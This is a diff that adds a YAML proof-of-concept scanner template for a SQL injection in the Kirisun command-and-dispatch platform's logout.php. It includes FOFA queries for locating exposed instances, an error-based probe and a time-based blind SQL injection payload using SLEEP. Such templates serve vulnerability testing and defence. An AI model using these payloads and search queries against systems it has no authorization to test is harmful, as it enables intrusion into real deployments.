@@ -1,0 +1,22 @@
+id: poc-yaml-kirisun-logout-php-sqli
+info:
+  name: 福建科立讯通信 指挥调度管理平台 logout.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 科立讯指挥调度管理平台
+  fofa: body="app/structure/departments.php" || app="指挥调度管理平台"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /custom/zx/logout.php?sign=1'
+  expression: status_code == 200 && contains(body,"SQL执行失败") && contains(body,"SQL
+    syntax")
+- method: GET
+  path: /custom/zx/logout.php?sign=1%27+AND+(SELECT+4068+FROM+(SELECT(SLEEP({{.t1}})))Vgsc)--+qhh
+  expression: status_code == 200 && contains(body,"\"msg\":\"ok\"") && !contains(body,"<")
+    && duration > t2 && duration < t3
+transport: http
